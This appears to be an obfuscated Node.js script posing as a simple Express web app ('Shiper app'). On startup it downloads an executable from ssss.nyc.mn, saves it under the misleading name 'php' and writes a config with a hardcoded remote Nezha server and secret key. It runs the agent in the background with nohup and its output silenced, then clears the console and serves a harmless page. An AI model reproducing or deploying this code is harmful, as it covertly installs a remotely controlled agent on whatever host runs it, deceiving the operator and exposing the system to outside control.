const _0x5b0e47=_0x2b99;(function(_0xf62082,_0x1c7637){const _0x216f56=_0x2b99,_0x134596=_0xf62082();while(!![]){try{const _0x313c60=-parseInt(_0x216f56(0x10e))/0x1+-parseInt(_0x216f56(0xf4))/0x2+parseInt(_0x216f56(0x106))/0x3+parseInt(_0x216f56(0xe7))/0x4+-parseInt(_0x216f56(0xfe))/0x5*(-parseInt(_0x216f56(0xf3))/0x6)+-parseInt(_0x216f56(0x102))/0x7+-parseInt(_0x216f56(0x103))/0x8*(parseInt(_0x216f56(0xfc))/0x9);if(_0x313c60===_0x1c7637)break;else _0x134596['push'](_0x134596['shift']());}catch(_0x11c7fa){_0x134596['push'](_0x134596['shift']());}}}(_0x3b90,0x3f3de));function _0x3b90(){const _0x3cbe6b=['676172ZYPcnn','true','NEZHA_SERVER','util','8443','axios','existsSync','NEZHA_KEY','stream','child_process','send','PORT','186zKHDGd','606212cjsmoA','php','Start\x20nezha\x20php\x20error:','client_secret:\x20','FILE_PATH','finish','message','includes','49176bOGuPK','Download\x20error:','55995pGGwaE','log','amd','listen','2259096nUdWfB','32SbSKyi','split','\x20-c\x20','1363158IqqyIn','writeFileSync','2053','false','pipe','join','./tmp','get','63870ZlbLJk','env','data','createWriteStream','https://amd64.ssss.nyc.mn/v1','arm','\x0adisable_auto_update:\x20true\x0a','443','Downloading\x20php\x20agent\x20from\x20','exec','error','arch','\x0auuid:\x20','\x0aserver:\x20','NEZHA_SERVER\x20or\x20NEZHA_KEY\x20not\x20set,\x20skipping\x20nezha\x20agent.','\x20>/dev/null\x202>&1\x20&','pop','Web\x20server\x20running\x20on\x20port\x20'];_0x3b90=function(){return _0x3cbe6b;};return _0x3b90();}const fs=require('fs'),os=require('os'),path=require('path'),axios=require(_0x5b0e47(0xec)),express=require('express'),{promisify}=require(_0x5b0e47(0xea)),exec=promisify(require(_0x5b0e47(0xf0))[_0x5b0e47(0xde)]),FILE_PATH=process[_0x5b0e47(0x10f)][_0x5b0e47(0xf8)]||_0x5b0e47(0x10c),UUID=process[_0x5b0e47(0x10f)]['UUID']||'27a361d6-9546-4817-a512-87ea90cfc71a',NEZHA_SERVER=process[_0x5b0e47(0x10f)][_0x5b0e47(0xe9)]||'a.holoy.dpdns.org:36958',NEZHA_KEY=process[_0x5b0e47(0x10f)][_0x5b0e47(0xee)]||'NwxKJwM9UKRCX5TBPaBm0IrjNCSyflif';if(!fs[_0x5b0e47(0xed)](FILE_PATH))fs['mkdirSync'](FILE_PATH,{'recursive':!![]});function clearScreen(){const _0x725a0b=_0x5b0e47;console[_0x725a0b(0xff)]('\x1bc');}function getSystemArchitecture(){const _0x598387=_0x5b0e47,_0x4f226c=os[_0x598387(0xe0)]();return _0x4f226c[_0x598387(0xfb)](_0x598387(0x113))?'arm':_0x598387(0x100);}function _0x2b99(_0x32de1b,_0x399c56){const _0x3b902d=_0x3b90();return _0x2b99=function(_0x2b99f9,_0x4d8f99){_0x2b99f9=_0x2b99f9-0xdd;let _0x1cdbca=_0x3b902d[_0x2b99f9];return _0x1cdbca;},_0x2b99(_0x32de1b,_0x399c56);}async function downloadFile(_0x382fbe,_0x13bfff){const _0x28d99c=_0x5b0e47,_0x5a5c70=path['join'](FILE_PATH,_0x382fbe),_0x30e05c=await axios({'method':_0x28d99c(0x10d),'url':_0x13bfff,'responseType':_0x28d99c(0xef)});return new Promise((_0x441a23,_0x1bc4f3)=>{const _0x47e4bd=_0x28d99c,_0x5b8497=fs[_0x47e4bd(0x111)](_0x5a5c70,{'mode':0x1ed});_0x30e05c[_0x47e4bd(0x110)][_0x47e4bd(0x10a)](_0x5b8497),_0x5b8497['on'](_0x47e4bd(0xf9),()=>_0x441a23(_0x5a5c70)),_0x5b8497['on']('error',_0x517589=>{fs['unlink'](_0x5a5c70,()=>{}),_0x1bc4f3(_0x517589);});});}async function startNezhaV1(){const _0x186d1f=_0x5b0e47;if(!NEZHA_SERVER||!NEZHA_KEY){console['log'](_0x186d1f(0xe3));return;}const _0x46b5f1=getSystemArchitecture(),_0x5c3e5b=_0x46b5f1===_0x186d1f(0x113)?'https://arm64.ssss.nyc.mn/v1':_0x186d1f(0x112);try{console[_0x186d1f(0xff)](_0x186d1f(0xdd)+_0x5c3e5b),await downloadFile(_0x186d1f(0xf5),_0x5c3e5b),fs['chmodSync'](path[_0x186d1f(0x10b)](FILE_PATH,_0x186d1f(0xf5)),0x1ed);}catch(_0x2d0f7d){console['error'](_0x186d1f(0xfd),_0x2d0f7d[_0x186d1f(0xfa)]||_0x2d0f7d);return;}const _0x4fc4fe=new Set([_0x186d1f(0x115),_0x186d1f(0xeb),'2096','2087','2083',_0x186d1f(0x108)]),_0x4412b2=NEZHA_SERVER[_0x186d1f(0xfb)](':')?NEZHA_SERVER[_0x186d1f(0x104)](':')[_0x186d1f(0xe5)]():'',_0x2cf30c=_0x4fc4fe['has'](_0x4412b2)?_0x186d1f(0xe8):_0x186d1f(0x109),_0x1c016b=_0x186d1f(0xf7)+NEZHA_KEY+_0x186d1f(0xe2)+NEZHA_SERVER+_0x186d1f(0xe1)+UUID+'\x0atls:\x20'+_0x2cf30c+_0x186d1f(0x114);fs[_0x186d1f(0x107)](path[_0x186d1f(0x10b)](FILE_PATH,'config.yaml'),_0x1c016b);const _0x22ab32='nohup\x20'+path['join'](FILE_PATH,_0x186d1f(0xf5))+_0x186d1f(0x105)+path['join'](FILE_PATH,'config.yaml')+_0x186d1f(0xe4);try{await exec(_0x22ab32),console['log']('Nezha\x20v1\x20(php)\x20started');}catch(_0x278f0c){console[_0x186d1f(0xdf)](_0x186d1f(0xf6),_0x278f0c[_0x186d1f(0xfa)]||_0x278f0c);}}function startWebServer(){const _0x43bac1=_0x5b0e47,_0x50ce50=express();_0x50ce50[_0x43bac1(0x10d)]('/',(_0xc829a,_0x48d9c4)=>{const _0x300c22=_0x43bac1;_0x48d9c4[_0x300c22(0xf1)]('Shiper\x20app\x20is\x20running\x20with\x20Nezha\x20v1\x20agent\x20ðŸš€');});const _0xbace50=process[_0x43bac1(0x10f)][_0x43bac1(0xf2)]||0xbb8;_0x50ce50[_0x43bac1(0x101)](_0xbace50,()=>{const _0x307a71=_0x43bac1;console[_0x307a71(0xff)](_0x307a71(0xe6)+_0xbace50);});}((async()=>{await startNezhaV1(),clearScreen(),startWebServer(),setInterval(()=>{},0x3e8*0x3c);})());
